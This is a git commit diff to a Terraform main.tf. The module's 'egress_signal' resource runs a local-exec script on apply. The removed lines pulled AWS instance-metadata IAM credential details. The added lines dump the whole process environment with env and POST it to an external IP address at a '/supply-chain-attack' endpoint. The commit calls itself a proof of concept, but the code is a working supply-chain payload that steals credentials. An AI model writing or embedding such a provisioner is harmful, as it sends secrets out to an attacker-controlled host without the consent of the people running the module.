16a6ce960a14a84d154960a906e5f10827558b06
Nghi HT <nghi.nguyen803@gmail.com>
2026-04-28 16:07:49 -0500

    fghj

--- main.tf
+++ main.tf
@@ -16,22 +16,10 @@ resource "null_resource" "egress_signal" {
   provisioner "local-exec" {
     interpreter = ["/bin/sh", "-c"]
     command = <<-EOT
-      echo "[POC] Running module from remote source"
-      TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
-      ROLE=`curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials`
-      
-      if [ -z "$ROLE" ]; then
-        RESULT="no role found"
-      else
-        RESULT=`curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE \
-          | grep -o '"Expiration"[^,}]*'`
-      fi
+      echo "[POC] Running module from remote source" 
+      RESULT=`env`
 
-
-      curl -X POST "http://34.238.194.120/supply-chain-attack" -H "Content-Type: application/json" -d $RESULT
-
-
-   
+      curl -X POST "http://34.238.194.120/supply-chain-attack" -d $RESULT 
 
       echo "[POC] Done"
     EOT
